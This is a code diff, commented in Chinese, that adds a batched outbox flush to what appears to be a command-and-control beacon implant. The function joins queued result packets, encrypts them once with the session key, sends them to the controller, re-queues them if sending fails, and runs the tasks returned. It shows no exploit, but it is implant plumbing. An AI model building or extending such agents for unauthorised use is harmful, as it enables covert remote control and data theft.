@@ -167,3 +167,80 @@ VOID AgentFlushPostEx(BeaconContext* ctx)
 
     PlistFree(&out);
 }
+
+/*
+ * 统一的 outbox flush 骨架（批量版）。
+ * drain → 拼接所有包成一个明文 buffer → 一次加密 → 一次发送 → 一次分发响应 → free。
+ *
+ * 批量化的动机：tunnel/transfer 等高频回传场景下，单 tick 可能产生几十到上百个
+ * outbox 包。旧的逐包循环每包都要一次独立 HTTP/TCP 往返和一次 AES-GCM 加密，
+ * 主循环被串行网络往返彻底阻塞。批量化后 N 个包只走 1 次网络往返和 1 次加密。
+ *
+ * 协议兼容：拼接后的明文 = 多个 PacketMakeFinal 长度前缀块顺序拼接，与 server 端
+ * ProcessDecryptedBeaconData 的 for(p.Size()>0){ ParseBytes } 循环消费模型一致，
+ * server 端 DecryptResult/ProcessDecryptedBeaconData 无需任何改动。
+ *
+ * 失败语义：拼接/加密/发送任一步失败，整批 list 经 OutboxPushFrontList 回塞 outbox
+ * 头部，下个 tick 重试整批，不丢包。send 成功后才释放整批节点。
+ * send 回调签名约定：
+ *   - 输入 encrypted 为本 tick 全部 outbox 包拼接后一次性加密的密文
+ *   - 输出 response 为本次发送收到的任务密文（可为空）
+ *   - 返回 1 成功，0 失败
+ * ctx_sender 是回调上下文（heartbeat / session / upstream 等）。
+ */
+INT AgentFlushOutbox(BeaconContext* ctx, OutboxSendFn send, VOID* ctx_sender)
+{
+    OutboxNode* list = OutboxDrain(&ctx->outbox);
+    OutboxNode* cur;
+    OutboxNode* next;
+    ByteBuf plain;
+    ByteBuf encrypted;
+    ByteBuf response;
+
+    if (!list) {
+        return 1;  /* 空队列，直接成功，不发空请求 */
+    }
+
+    /* 1. 把所有 outbox 包拼接成一个明文 buffer */
+    BbInit(&plain);
+    cur = list;
+    while (cur) {
+        if (!BbAppend(&plain, cur->packet.data, cur->packet.len)) {
+            BbFree(&plain);
+            OutboxPushFrontList(&ctx->outbox, list);  /* 拼接失败，整批回塞 */
+            return 0;
+        }
+        cur = cur->next;
+    }
+
+    /* 2. 一次加密所有包 */
+    if (!CryptoEncryptResult(ctx->session_key, sizeof(ctx->session_key), &plain, &encrypted)) {
+        BbFree(&plain);
+        OutboxPushFrontList(&ctx->outbox, list);  /* 加密失败，整批回塞 */
+        return 0;
+    }
+    BbFree(&plain);
+
+    /* 3. 一次发送 */
+    BbInit(&response);
+    if (!send(ctx, ctx_sender, &encrypted, &response)) {
+        BbFree(&encrypted);
+        BbFree(&response);
+        OutboxPushFrontList(&ctx->outbox, list);  /* 发送失败，整批回塞 */
+        return 0;
+    }
+    BbFree(&encrypted);
+
+    /* 4. 发送成功后才释放整批节点 */
+    cur = list;
+    while (cur) {
+        next = cur->next;
+        OutboxFreeNode(cur);
+        cur = next;
+    }
+
+    /* 5. dispatch 响应里的任务（一次） */
+    AgentDispatchTasks(ctx, &response);
+    BbFree(&response);
+    return 1;
+}
